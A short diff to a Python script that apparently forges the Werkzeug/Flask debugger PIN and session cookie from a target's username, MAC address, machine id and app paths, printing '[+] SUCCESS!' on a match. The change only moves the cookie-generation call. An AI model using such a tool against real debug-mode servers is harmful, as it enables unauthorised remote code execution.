@@ -72,12 +72,12 @@ def main():
     cgroup_file = args.cgroup.strip().rpartition("/")[2].encode("UTF-8")
     mch_id += cgroup_file
     
-    cookie = ''
+    
     
    
     mac = int("".join(args.mac.split(":")),16)
     res = gen_pin(args.username, mac, mch_id, args.path, args.modname, args.appname)
-    
+    cookie = generate_cookie(res[0])
     
     if res[0] != '' and res[1] != '':
         print("[+] SUCCESS!")
